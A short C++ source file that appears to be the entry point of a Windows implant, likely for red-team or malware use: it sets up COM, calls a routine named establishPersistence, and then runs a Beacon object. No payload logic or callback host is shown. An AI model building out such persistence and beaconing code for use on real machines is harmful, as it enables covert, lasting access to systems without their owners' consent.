#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include <objbase.h>

int main() {
    CoInitialize(NULL);
    persistence::establishPersistence();
    beacon::Beacon beacon;
    beacon.run();
    CoUninitialize();
    return 0;
}
